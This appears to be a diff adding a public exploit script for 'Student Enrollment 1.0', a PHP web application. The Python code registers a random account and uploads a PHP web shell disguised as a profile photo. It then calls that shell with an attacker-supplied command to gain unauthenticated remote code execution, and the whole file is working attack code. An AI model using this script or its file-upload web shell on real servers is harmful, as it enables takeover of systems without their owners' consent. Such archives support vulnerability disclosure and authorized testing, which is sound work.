@@ -1,0 +1,44 @@
+# Exploit Title: Student Enrollment 1.0 - Unauthenticated Remote Code Execution
+# Date: 2020-06-22
+# Exploit Author: Selim Enes 'Enesdex' Karaduman
+# Vendor Homepage: https://www.sourcecodester.com/php/14281/online-student-enrollment-system-using-phpmysqli.html
+# Version: 1.0
+# Tested on: Windows 10 / WampServer
+# Usage : python3 exploit.py -u TARGET_URL -c CODE_TO_EXECUTE
+
+import requests
+import string 
+import random 
+import sys
+import getopt
+
+options, remainder = getopt.gnu_getopt(sys.argv[1:], 'hu:c:')
+
+for opt, arg in options:
+    if opt in ('-h'): 
+        print('Usage: python3 exploit.py -u TARGET_URL -c CODE_TO_EXECUTE')
+        exit()
+    elif opt in ('-u'):
+        url = arg
+    elif opt in ('-c'):
+        cmd = arg
+
+
+
+res = ''.join(random.choices(string.ascii_uppercase + string.digits, k = 10)) 
+
+session = requests.session()
+
+burp0_url = url+"/admin/register.php"
+burp0_cookies      = {}
+burp0_headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Referer": "http://192.168.1.100/student_enrollment/admin/register.php", "Content-Type": "multipart/form-data; boundary=---------------------------5220369311929647034402434351", "Connection": "close", "Upgrade-Insecure-Requests": "1"}
+burp0_data = "-----------------------------5220369311929647034402434351\r\nContent-Disposition: form-data; name=\"name\"\r\n\r\n"+res+"\r\n-----------------------------5220369311929647034402434351\r\nContent-Disposition: form-data; name=\"email\"\r\n\r\n"+res+"@gmail.com\r\n-----------------------------5220369311929647034402434351\r\nContent-Disposition: form-data; name=\"username\"\r\n\r\n"+res+"\r\n-----------------------------5220369311929647034402434351\r\nContent-Disposition: form-data; name=\"password\"\r\n\r\n12345678\r\n-----------------------------5220369311929647034402434351\r\nContent-Disposition: form-data; name=\"c_password\"\r\n\r\n12345678\r\n-----------------------------5220369311929647034402434351\r\nContent-Disposition: form-data; name=\"photo\"; filename=\"a.php\"\r\nContent-Type: application/x-php\r\n\r\n<?php\n$cmd = shell_exec($_GET['cmd']); echo $cmd;\n?>\n\r\n-----------------------------5220369311929647034402434351\r\nContent-Disposition: form-data; name=\"register\"\r\n\r\n\r\n-----------------------------5220369311929647034402434351--\r\n"
+session.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data)
+
+rce = requests.get("http://192.168.1.100/student_enrollment/admin/images/"+res+".php?cmd="+cmd)
+
+get_code = rce.text
+
+print("Exploit Author--> Selim Enes 'Enesdex' Karaduman")
+
+print(get_code)
